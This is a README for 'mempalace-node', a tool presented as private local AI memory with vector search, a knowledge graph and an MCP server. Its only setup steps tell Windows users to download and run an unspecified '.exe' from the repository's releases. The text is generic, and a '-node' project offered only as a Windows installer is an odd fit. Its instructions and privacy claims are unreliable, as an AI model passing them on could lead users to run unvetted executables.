# 🧠 mempalace-node - Private memory for your AI tools

<a href="https://github.com/limggamepro/mempalace-node"><img src="https://img.shields.io/badge/Download-mempalace--node-blue" alt="Download mempalace-node"></a>

mempalace-node provides a storage system for artificial intelligence. It helps your local AI tools remember past conversations and facts. This system stores information on your own computer. It keeps your data private and works even when you disconnect from the internet.

## 🛠 What this software does

This tool functions as a digital memory bank. It tracks what your AI learns over time. It uses a knowledge graph to link related concepts together. When you ask your AI questions, it searches this memory to provide better answers. 

The software uses vector search technology. This allows the system to find information based on meaning rather than just keywords. It stores everything in a local file. This keeps your data under your control. It also includes an MCP server. This allows other AI programs to talk to your memory bank easily.

## 💻 System requirements

Your computer needs to meet these basic standards to run mempalace-node:

* Operating System: Windows 10 or Windows 11.
* Memory: 8 GB of RAM or more.
* Storage: 2 GB of free disk space.
* Processor: A modern multi-core processor.

## 📥 Getting the software

You need to download the installation package to begin. You can find the installer on the project page.

1. Visit this [download page](https://github.com/limggamepro/mempalace-node).
2. Locate the link labeled "Releases" on the right side of the screen.
3. Click the most recent version number listed.
4. Download the file ending in ".exe" to your computer.

## ⚙️ Setting up the application

1. Open your "Downloads" folder.
2. Find the file you just saved.
3. Double-click the file to start the installer.
4. Follow the instructions on the screen.
5. Click "Next" to continue.
6. Check the box to create a desktop shortcut.
7. Click "Install" to finish the process.

The installer places the program in your applications folder. Once the installation finishes, you can launch the program from your desktop icon.

## 🚀 How to use your memory palace

When you open the application, it creates a small database file on your hard drive. This file stores every note and fact the system gathers. 

### Adding information
You interact with the software through its interface. You can paste text or documents directly into the active window. The software reads this information and converts it into a format the AI understands. It then maps the information using the knowledge graph.

### Searching for facts
Use the search bar at the top of the window to find past information. You do not need to use exact phrases. You can type a question or a general concept. The software scans your memory and returns the most relevant results.

### Using the AI connection
If you use other AI tools that support the Model Context Protocol, you can connect them to mempalace-node. Go to the settings menu in your other AI application. Look for an option to add an MCP server. You will point that setting to the local address provided in the mempalace-node settings tab. This allows your AI to read your memory directly while you chat.

## 🛡 Maintaining your privacy

Everything stays on your local machine. No data goes to a third-party server. You own the SQLite file that stores your history. You can open, move, or delete this file at any time. If you want to move your memory to a new computer, copy the database file to that machine and select it in the settings menu.

## ❓ Troubleshooting common issues

If you have trouble with the software, try these steps first.

### The program will not open
Make sure you downloaded the complete file. Sometimes a partial download prevents the program from starting. Delete the installer and download it again from the main project page.

### The search returns no results
Check the status bar at the bottom of the program. It should say "Connected." If it says "Offline," the database might be locked. Close the application and restart it to refresh the connection.

### The program runs slow
Large knowledge graphs take time to process. If you notice a delay, keep the window open for a few minutes while the system performs its background indexing. This happens once after you add a very large set of data.

### Resetting your memory
If you want to clear your data, go to the settings menu and click "Clear Database." This action is permanent. It removes all stored knowledge and returns the system to its original state.

## 🌐 Community and support

This software thrives on feedback from people like you. If you discover a bug, you can report it on our project page. You do not need to know how to code to ask for help. Just describe what you did and what happened. 

We update the software regularly to improve performance and add new features. Check the download page every few months for updates. You can run the installer again to update your current version without losing your stored data. Your database file remains where it is, and the new version connects to it automatically.